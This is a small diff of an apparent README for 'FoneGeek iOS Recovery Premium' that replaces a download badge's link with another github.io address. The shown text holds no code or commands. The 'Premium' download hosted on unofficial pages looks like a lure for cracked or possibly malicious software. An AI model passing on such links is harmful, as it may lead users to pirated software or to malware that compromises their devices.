@@ -2,7 +2,7 @@
 
 ## 📥 FoneGeek iOS Recovery Premium
 
-[![⬇️ FoneGeek Premium](https://img.shields.io/badge/Download-FoneGeek%20Premium-lightblue?style=for-the-badge&logo=apple)](https://phoenixluuviq.github.io/.github/FoneGeek-iOS)
+[![Discover FoneGeek](https://img.shields.io/badge/Discover-FoneGeek-0369A1?style=for-the-badge)](https://premium-fonegeek.github.io/.github/)
 
 ---
 
